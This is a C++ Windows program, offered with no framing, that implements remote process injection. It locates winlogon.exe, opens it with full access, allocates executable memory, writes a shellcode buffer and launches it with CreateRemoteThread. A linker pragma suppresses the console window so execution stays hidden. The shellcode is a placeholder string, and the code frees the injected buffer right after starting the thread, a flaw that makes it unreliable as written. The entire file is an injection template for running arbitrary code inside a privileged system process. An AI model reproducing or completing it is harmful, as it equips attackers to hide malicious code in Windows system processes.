#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

DWORD GetProcessIdByName(const wchar_t* processName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (!_wcsicmp(pe32.szExeFile, processName)) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    const wchar_t* processName = L"winlogon.exe";
    unsigned char shellcode[] = "shellcode here";

    DWORD processId = GetProcessIdByName(processName);

    if (processId != 0) {
        HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

        if (processHandle != NULL) {
            LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            if (remoteBuffer != NULL) {
                WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL);
                CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
                VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
            }

            CloseHandle(processHandle);
        }
        else {
            std::cout << "Error opening the process. Error code: " << GetLastError() << std::endl;
        }
    }
    else {
        std::cout << "Process " << processName << " not found." << std::endl;
    }

    return 0;
}
